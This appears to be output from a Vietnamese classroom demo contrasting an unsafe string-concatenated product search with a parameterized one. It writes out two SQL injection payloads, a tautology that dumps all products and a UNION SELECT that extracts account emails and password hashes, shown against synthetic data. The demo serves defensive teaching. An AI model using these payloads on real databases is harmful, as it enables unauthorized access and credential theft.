===== B. Tan cong 1: lay TOAN BO san pham. Nhap: "' OR '1'='1' -- " =====
[Khong an toan] Cau SQL thuc te:
   SELECT p.name AS ten, v.price AS gia FROM product p JOIN product_variant v ON v.product_id = p.product_id WHERE p.name LIKE '%' OR '1'='1' -- %' LIMIT 20
   -> 2511 dong
      {'ten': 'Quần jean Canifa 00001', 'gia': Decimal('627000.00')}
      {'ten': 'Quần jean Canifa 00001', 'gia': Decimal('324000.00')}
      {'ten': 'Quần jean Owen 00002', 'gia': Decimal('842000.00')}
[An toan] Tham so gui di: ["%' OR '1'='1' -- %", 20]
   -> 0 dong

===== C. Tan cong 2: an cap email tai khoan. Nhap: "khongco' UNION SELECT email, password_hash FROM account -- " =====
[Khong an toan] Cau SQL thuc te:
   SELECT p.name AS ten, v.price AS gia FROM product p JOIN product_variant v ON v.product_id = p.product_id WHERE p.name LIKE '%khongco' UNION SELECT email, password_hash FROM account -- %' LIMIT 20
   -> 10100 dong
      {'ten': 'khach000001@example.test', 'gia': 'demo-hash'}
      {'ten': 'khach000002@example.test', 'gia': 'demo-hash'}
      {'ten': 'khach000003@example.test', 'gia': 'demo-hash'}
[An toan] Tham so gui di: ["%khongco' UNION SELECT email, password_hash FROM account -- %", 20]
   -> 0 dong
